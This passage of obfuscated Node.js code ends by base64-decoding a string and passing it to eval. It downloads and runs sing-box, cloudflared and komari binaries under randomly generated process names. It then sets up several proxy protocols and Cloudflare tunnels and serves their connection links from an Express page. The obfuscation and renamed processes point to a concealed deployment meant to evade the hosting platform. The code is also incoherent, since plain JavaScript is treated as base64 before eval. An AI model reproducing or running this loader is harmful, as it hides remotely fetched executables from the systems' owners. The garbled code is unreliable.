_0x252e0f=_0x53f00e;if(!CONFIG[_0x252e0f(0x1ed)]||CONFIG[_0x252e0f(0x201)]&&CONFIG['REALITY_PUBLIC_KEY'])return;return new Promise(_0x4086f7=>{const _0x1e1d5e=_0x252e0f;exec('\x22'+_0x14bc3a+_0x1e1d5e(0x1eb),(_0x13a3c5,_0x5851d4)=>{const _0x29785b=_0x1e1d5e;if(!_0x13a3c5&&_0x5851d4){const _0x8c8702=_0x5851d4[_0x29785b(0x1d7)](/PrivateKey:\s*(\S+)/),_0xbb3e6a=_0x5851d4[_0x29785b(0x1d7)](/PublicKey:\s*(\S+)/);_0x8c8702&&_0xbb3e6a&&(CONFIG[_0x29785b(0x201)]=_0x8c8702[0x1],CONFIG[_0x29785b(0x208)]=_0xbb3e6a[0x1]);}_0x4086f7();});});}async function generateSingBoxConfig(){const _0x359712=_0x53f00e,_0x42fbf1=[];CONFIG[_0x359712(0x1c9)]&&_0x42fbf1[_0x359712(0x21a)]({'type':_0x359712(0x26c),'tag':'hy2-in','listen':'0.0.0.0','listen_port':parseInt(CONFIG[_0x359712(0x1c9)]),'users':[{'password':CONFIG[_0x359712(0x251)]}],'tls':{'enabled':!![],'server_name':CONFIG[_0x359712(0x224)],'insecure':!![],'alpn':['h3']}});CONFIG[_0x359712(0x238)]&&_0x42fbf1[_0x359712(0x21a)]({'type':'vmess','tag':_0x359712(0x271),'listen':_0x359712(0x1ad),'listen_port':parseInt(CONFIG[_0x359712(0x238)]),'users':[{'uuid':CONFIG[_0x359712(0x1c0)],'alterId':0x0}],'transport':{'type':'ws','path':CONFIG[_0x359712(0x275)],'headers':{}}});CONFIG[_0x359712(0x1ed)]&&_0x42fbf1[_0x359712(0x21a)]({'type':_0x359712(0x22b),'tag':_0x359712(0x229),'listen':_0x359712(0x1ad),'listen_port':parseInt(CONFIG[_0x359712(0x1ed)]),'users':[{'uuid':CONFIG[_0x359712(0x1c0)],'flow':_0x359712(0x1d8)}],'tls':{'enabled':!![],'server_name':CONFIG[_0x359712(0x270)],'reality':{'enabled':!![],'handshake':{'server':CONFIG[_0x359712(0x270)],'server_port':0x1bb},'private_key':CONFIG[_0x359712(0x201)],'short_id':[CONFIG[_0x359712(0x219)]]}}});CONFIG['TUIC_PORT']&&_0x42fbf1['push']({'type':_0x359712(0x1d5),'tag':'tuic-in','listen':_0x359712(0x1ad),'listen_port':parseInt(CONFIG[_0x359712(0x22e)]),'users':[{'uuid':CONFIG[_0x359712(0x1ab)],'password':CONFIG[_0x359712(0x1dd)]}],'congestion_control':_0x359712(0x220),'auth_timeout':'3s','zero_rtt_handshake':![],'heartbeat':_0x359712(0x1cc),'tls':{'enabled':!![],'server_name':CONFIG[_0x359712(0x224)],'insecure':!![],'alpn':['h3']}});const _0x1be16d={'log':{'level':_0x359712(0x1fc),'timestamp':!![]},'dns':{'servers':[{'tag':_0x359712(0x264),'address':_0x359712(0x273)},{'tag':_0x359712(0x26e),'address':_0x359712(0x1c1)}],'final':_0x359712(0x264)},'inbounds':_0x42fbf1,'outbounds':[{'type':_0x359712(0x207),'tag':'direct'},{'type':'block','tag':_0x359712(0x26b)}],'route':{'rules':[{'ip_is_private':!![],'outbound':_0x359712(0x207)}],'final':_0x359712(0x207)},'experimental':{'cache_file':{'enabled':!![],'path':path[_0x359712(0x1af)](WORK_DIR,'cache.db')}}},_0x4e9f6b=path[_0x359712(0x1af)](WORK_DIR,_0x359712(0x1ce));return fs[_0x359712(0x1b4)](_0x4e9f6b,JSON[_0x359712(0x210)](_0x1be16d,null,0x2)),_0x4e9f6b;}function generateLinks(_0x426d66){const _0xbbc9d3=_0x53f00e,_0x14f8d8=[];CONFIG['HY2_PORT']&&_0x14f8d8[_0xbbc9d3(0x21a)]({'protocol':_0xbbc9d3(0x1d1),'url':'hysteria2://'+CONFIG['HY2_PASSWORD']+'@'+_0x426d66+':'+CONFIG[_0xbbc9d3(0x1c9)]+_0xbbc9d3(0x1e7)+CONFIG[_0xbbc9d3(0x224)]+'&alpn=h3#HY2'});if(CONFIG[_0xbbc9d3(0x238)]){const _0x15264c={'v':'2','ps':_0xbbc9d3(0x222),'add':CONFIG['B_D'],'port':'443','id':CONFIG[_0xbbc9d3(0x1c0)],'aid':'0','scy':_0xbbc9d3(0x1d6),'net':'ws','type':_0xbbc9d3(0x24e),'host':CONFIG[_0xbbc9d3(0x206)],'path':CONFIG['VMESS_PATH'],'tls':_0xbbc9d3(0x1aa),'sni':CONFIG[_0xbbc9d3(0x206)],'alpn':'','fp':_0xbbc9d3(0x244)};_0x14f8d8[_0xbbc9d3(0x21a)]({'protocol':_0xbbc9d3(0x1fb),'url':'vmess://'+Buffer[_0xbbc9d3(0x236)](JSON[_0xbbc9d3(0x210)](_0x15264c))[_0xbbc9d3(0x272)]('base64')});}return CONFIG[_0xbbc9d3(0x1ed)]&&_0x14f8d8[_0xbbc9d3(0x21a)]({'protocol':_0xbbc9d3(0x25e),'url':_0xbbc9d3(0x1be)+CONFIG[_0xbbc9d3(0x1c0)]+'@'+_0x426d66+':'+CONFIG[_0xbbc9d3(0x1ed)]+_0xbbc9d3(0x1b0)+CONFIG[_0xbbc9d3(0x270)]+_0xbbc9d3(0x1ee)+CONFIG[_0xbbc9d3(0x208)]+_0xbbc9d3(0x218)+CONFIG['REALITY_SHORT_ID']+_0xbbc9d3(0x1ac)}),CONFIG[_0xbbc9d3(0x22e)]&&_0x14f8d8['push']({'protocol':_0xbbc9d3(0x242),'url':'tuic://'+CONFIG['TUIC_UUID']+':'+CONFIG['TUIC_PASSWORD']+'@'+_0x426d66+':'+CONFIG[_0xbbc9d3(0x22e)]+_0xbbc9d3(0x24f)}),_0x14f8d8;}function _0x2b4f(_0x55e22d,_0x370ecf){const _0x59be38=_0x59be();return _0x2b4f=function(_0x2b4ff9,_0x2e2ebe){_0x2b4ff9=_0x2b4ff9-0x1a6;let _0x53d2a0=_0x59be38[_0x2b4ff9];return _0x53d2a0;},_0x2b4f(_0x55e22d,_0x370ecf);}function cleanup(){const _0x2a9e3f=_0x53f00e;processes[_0x2a9e3f(0x23a)](_0x641db2=>{const _0x3cdddc=_0x2a9e3f;try{_0x641db2[_0x3cdddc(0x233)]();}catch(_0x329c02){}}),process[_0x2a9e3f(0x1b6)](0x0);}async function startService(_0x2b7a56,_0x41c2af,_0x3dab87,_0x28f577={}){const _0x5a0e16=_0x53f00e;try{const _0x1d636a=spawn(_0x2b7a56,_0x41c2af,{'stdio':[_0x5a0e16(0x1f2),'pipe',_0x5a0e16(0x265)],..._0x28f577});if(_0x28f577[_0x5a0e16(0x20e)]){const _0x43079e=fs[_0x5a0e16(0x23f)](_0x28f577['logFile']);_0x1d636a['stdout'][_0x5a0e16(0x265)](_0x43079e),_0x1d636a['stderr'][_0x5a0e16(0x265)](_0x43079e);}return serviceStatus[_0x3dab87[_0x5a0e16(0x1fa)]()]=_0x5a0e16(0x24b),_0x1d636a['on']('spawn',()=>{const _0x5e793e=_0x5a0e16;serviceStatus[_0x3dab87[_0x5e793e(0x1fa)]()]=_0x5e793e(0x24b);}),_0x1d636a['on'](_0x5a0e16(0x247),()=>{const _0x36dbdf=_0x5a0e16;serviceStatus[_0x3dab87['toLowerCase']()]=_0x36dbdf(0x247);}),_0x1d636a['on'](_0x5a0e16(0x1b6),()=>{const _0x2a5e4a=_0x5a0e16;serviceStatus[_0x3dab87[_0x2a5e4a(0x1fa)]()]=_0x2a5e4a(0x203);}),new Promise(_0x1b1f22=>{const _0x302e47=()=>{const _0x1ec0b4=_0x2b4f;_0x1d636a[_0x1ec0b4(0x23d)]?(serviceStatus[_0x3dab87[_0x1ec0b4(0x1fa)]()]=_0x1ec0b4(0x203),_0x1b1f22(null)):(processes['push'](_0x1d636a),_0x1b1f22(_0x1d636a));};setTimeout(_0x302e47,0x7d0);});}catch(_0x8ba617){return serviceStatus[_0x3dab87[_0x5a0e16(0x1fa)]()]=_0x5a0e16(0x247),null;}}const app=express();app[_0x53f00e(0x209)]('/',(_0x3dd524,_0xb9512f)=>{const _0x1d32c1=_0x53f00e;_0xb9512f['writeHead'](0xc8,{'Content-Type':_0x1d32c1(0x24a)}),_0xb9512f[_0x1d32c1(0x1ec)](HTML_TEMPLATES[_0x1d32c1(0x1dc)]);}),app[_0x53f00e(0x209)](_0x53f00e(0x20d),async(_0x907158,_0x49f7d0)=>{const _0x48e5ea=_0x53f00e,_0x32054a=await getServerIP(),_0x3a9396=generateLinks(_0x32054a);_0x49f7d0[_0x48e5ea(0x1f0)](0xc8,{'Content-Type':_0x48e5ea(0x24a)}),_0x49f7d0[_0x48e5ea(0x1ec)](HTML_TEMPLATES[_0x48e5ea(0x1c2)](_0x32054a,_0x3a9396));}),app['get']('/x',async(_0x5691a9,_0x20f9b1)=>{const _0x9252f=_0x53f00e,_0x3e16ac=await getServerIP(),_0x423cba=generateLinks(_0x3e16ac);_0x20f9b1[_0x9252f(0x1f0)](0xc8,{'Content-Type':_0x9252f(0x24a)}),_0x20f9b1['end'](HTML_TEMPLATES['status'](_0x3e16ac,_0x423cba));}),app[_0x53f00e(0x209)](_0x53f00e(0x1ef),(_0x1a16b0,_0x3ed32d)=>{const _0x4c099d=_0x53f00e;_0x3ed32d['writeHead'](0xc8,{'Content-Type':'application/json'}),_0x3ed32d[_0x4c099d(0x1ec)](JSON[_0x4c099d(0x210)]({'status':'ok','uptime':process[_0x4c099d(0x259)]()}));});const server=http['createServer'](app);server['on'](_0x53f00e(0x20a),createProxyMiddleware({'target':_0x53f00e(0x232)+CONFIG[_0x53f00e(0x238)],'changeOrigin':!![],'ws':!![],'logLevel':'silent'}));async function main(){const _0x4dbdfd=_0x53f00e;server[_0x4dbdfd(0x1d0)](CONFIG[_0x4dbdfd(0x1de)],()=>{const _0x12a11a=_0x4dbdfd;serviceStatus[_0x12a11a(0x252)]=_0x12a11a(0x24b);});try{const _0x503d86=detectArch(),_0x5edf37=_0x503d86===_0x4dbdfd(0x1f3),_0x24ba99=getRandomProcessName(),_0x3202ae=getRandomProcessName(),_0x5030ba=getRandomProcessName(),_0x24f48f=path['join'](WORK_DIR,_0x24ba99),_0xb8e313=path[_0x4dbdfd(0x1af)](WORK_DIR,_0x3202ae),_0x1900e6=path['join'](WORK_DIR,_0x5030ba),_0x1d2935={'singbox':_0x5edf37?_0x4dbdfd(0x261):_0x4dbdfd(0x217),'cloudflared':_0x5edf37?_0x4dbdfd(0x1df):_0x4dbdfd(0x1f8),'komari':_0x5edf37?_0x4dbdfd(0x205):_0x4dbdfd(0x1bb)};await Promise[_0x4dbdfd(0x260)]([downloadBinary(_0x1d2935[_0x4dbdfd(0x213)],_0x24f48f),downloadBinary(_0x1d2935[_0x4dbdfd(0x22d)],_0xb8e313),downloadBinary(_0x1d2935[_0x4dbdfd(0x1e9)],_0x1900e6)]),[_0x24f48f,_0xb8e313,_0x1900e6]['forEach'](_0x3f6d94=>{const _0x3e0ac0=_0x4dbdfd;if(!fs['existsSync'](_0x3f6d94))throw new Error(_0x3e0ac0(0x1c5)+_0x3f6d94);});const _0x138d15=await getServerIP();if(CONFIG['HY2_PORT']||CONFIG[_0x4dbdfd(0x238)]||CONFIG[_0x4dbdfd(0x1ed)]||CONFIG['TUIC_PORT']){await generateRealityKeys(_0x24f48f);const _0x34410c=await generateSingBoxConfig();try{await new Promise((_0xa7317a,_0x1b1dbd)=>{const _0x36bd34=_0x4dbdfd;exec('\x22'+_0x24f48f+_0x36bd34(0x228)+_0x34410c+'\x22',_0x4bd4f0=>{_0x4bd4f0?_0x1b1dbd(_0x4bd4f0):_0xa7317a();});}),await startService(_0x24f48f,[_0x4dbdfd(0x263),'-c',_0x34410c],_0x4dbdfd(0x213));}catch(_0xb1fbe1){serviceStatus[_0x4dbdfd(0x213)]=_0x4dbdfd(0x247);}}if(CONFIG['C_T'])try{const _0x4534a0=['tunnel',_0x4dbdfd(0x253),'auto',_0x4dbdfd(0x20c),_0x4dbdfd(0x230),_0x4dbdfd(0x1ea),'run',_0x4dbdfd(0x249),CONFIG[_0x4dbdfd(0x267)],_0x4dbdfd(0x240),_0x4dbdfd(0x1b3)+CONFIG[_0x4dbdfd(0x1de)]];await startService(_0xb8e313,_0x4534a0,_0x4dbdfd(0x22d));}catch(_0xf008c5){serviceStatus['cloudflared']='error';}else{if(CONFIG[_0x4dbdfd(0x238)]){const _0x5add46=await startTempTunnel(_0xb8e313,CONFIG['PORT']);!_0x5add46&&(serviceStatus['cloudflared']=_0x4dbdfd(0x247));}}if(CONFIG[_0x4dbdfd(0x1cd)]&&CONFIG['K_K']){const _0x57cde5=['-e',''+CONFIG['K_S'],'-t',''+CONFIG[_0x4dbdfd(0x239)],_0x4dbdfd(0x26a)];try{await startService(_0x1900e6,_0x57cde5,'komari',{'logFile':path['join'](WORK_DIR,_0x4dbdfd(0x221))});}catch(_0x3f2a29){serviceStatus[_0x4dbdfd(0x1e9)]='error';}}setInterval(()=>{const _0x4a5e9e=_0x4dbdfd;processes['forEach'](_0x36fb56=>{const _0x18bccf=_0x2b4f;if(_0x36fb56['killed']){const _0x1a4c0d=Object['keys'](serviceStatus)[_0x18bccf(0x24c)](_0x97a887=>serviceStatus[_0x97a887]==='running'&&!processes[_0x18bccf(0x21c)](_0x4bf72c=>_0x4bf72c!==_0x36fb56&&!_0x4bf72c[_0x18bccf(0x23d)]));_0x1a4c0d&&(serviceStatus[_0x1a4c0d]=_0x18bccf(0x203));}}),processes[_0x4a5e9e(0x1cb)]>0x0&&processes[_0x4a5e9e(0x257)](_0x430d17=>_0x430d17['killed'])&&cleanup();},0x2710),process['on'](_0x4dbdfd(0x25a),cleanup),process['on']('SIGTERM',cleanup);}catch(_0x2ff011){process[_0x4dbdfd(0x1b6)](0x1);}}main()['catch'](()=>process[_0x53f00e(0x1b6)](0x1));';
const code = Buffer.from(b, 'base64').toString();
eval(code);
